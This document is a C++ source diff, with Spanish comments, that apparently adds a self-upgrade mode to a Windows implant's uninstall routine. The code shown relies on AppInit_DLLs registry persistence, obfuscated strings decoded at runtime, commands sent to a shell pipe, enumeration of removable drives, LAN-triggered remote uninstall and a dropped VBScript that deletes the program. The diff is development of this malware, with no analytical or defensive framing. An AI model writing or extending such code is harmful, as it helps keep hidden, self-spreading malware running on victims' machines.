@@ -18,6 +18,7 @@ using namespace std;
 
 DWORD ACTIVE_UNISTALL_PROC_BY_DEMAND = FALSE;
 DWORD ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE = FALSE;
+DWORD ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE = FALSE;
 
 LPSTR* GetRemovableDrives(LPDWORD dwCount){
 	LPSTR lpBuffer = new CHAR[1024];
@@ -288,7 +289,7 @@ Cleanup:
 	return dwRetVal;
 }
 
-BOOL UnistallProc(BOOL Remote){
+BOOL UnistallProc(BOOL Remote, BOOL IsUpgrade){
 	LPSTR lpModuleFileName = new CHAR[MAX_PATH];
 	LPSTR lpTmpPath = new CHAR[MAX_PATH];
 	LPSTR lpTmpFileName = new CHAR[MAX_PATH];
@@ -302,7 +303,8 @@ BOOL UnistallProc(BOOL Remote){
 	DecodeString ds;
 
 	//Eliminacion de claves del registro: App_InitsDLL, 
-	DeleteAppInitRegValue();
+	if(!IsUpgrade)
+		DeleteAppInitRegValue();
 	
 	//Create Unload Mutex, to local machine
 	lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_cum), FLAG_DATA_IS_MACRO);
@@ -321,7 +323,7 @@ BOOL UnistallProc(BOOL Remote){
 
 	//Notificacion para desintalacion remota
 	boolRetIsNA = IsNetworkAlive(&dwINAFlags);
-	if(Remote && boolRetIsNA && (dwINAFlags & NETWORK_ALIVE_LAN))
+	if(Remote && boolRetIsNA && (dwINAFlags & NETWORK_ALIVE_LAN) && !IsUpgrade)
 		RemoteUnistallProc();
 
 	//Ejecucion de vbscript para eliminacion segura
@@ -361,12 +363,15 @@ BOOL UnistallProc(BOOL Remote){
 	fputs((LPCSTR)ds.getDecodeString((LPSTR)VBS_SCRIPT_CODE_UNISTALL), fd);
 	fclose(fd);
 
+	//Ejecucion del vbscript de desintalacion
+	if(!IsUpgrade)
+		sprintf(lpCmdLine, ds.getDecodeString((LPSTR)encStr_wscript_exe_s_s), lpTmpFileName, lpModuleFileName);	
+	else
+		sprintf(lpCmdLine, ds.getDecodeString((LPSTR)encStr_wscript_exe_s_s_s), lpTmpFileName, lpModuleFileName, FILE_ORIG_UPGRADE);	
+	ExecuteApp(lpCmdLine, NULL, FALSE, FALSE, NULL, NULL);
+
 	//Espera para dar tiempo a deteccion de CUM por otras instancias
 	Sleep(5000);
-	
-	//Ejecucion del vbscript de desintalacion
-	sprintf(lpCmdLine, ds.getDecodeString((LPSTR)encStr_wscript_exe_s_s), lpTmpFileName, lpModuleFileName);	
-	ExecuteApp(lpCmdLine, NULL, FALSE, FALSE, NULL, NULL);
 
 	//Envio de macro local para descargarse
 	lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_unloadme), FLAG_DATA_IS_MACRO);
@@ -515,11 +520,13 @@ DWORD ThreadMonitor(LPVOID lpParam){
 	for(;;){
 		if(ACTIVE_UNISTALL_PROC_BY_DEMAND){
 			#ifdef DEBUG_SHOW_ERROR_TO_FILE
-			fileLogPrint("Actived uninstall by demand");			
+			fileLogPrint("Actived uninstall by demand");
+			if (ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE)
+				fileLogPrint("Upgrading");
 			#endif
 
-			Sleep(1500);
-			UnistallProc(ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE);
+			//Sleep(1500);
+			UnistallProc(ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE, ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE);
 			ExitThread(0);
 		}
 
@@ -528,7 +535,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 			fileLogPrint("Actived uninstall by uninstaller file");
 			#endif
 
-			UnistallProc(TRUE);
+			UnistallProc(TRUE, FALSE);
 			ExitThread(0);
 		}
 
@@ -541,7 +548,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 			fileLogPrint("Actived uninstall by interactive logon");
 			#endif
 
-			UnistallProc(TRUE);
+			UnistallProc(TRUE, FALSE);
 			ExitThread(0);
 		}
 		#endif
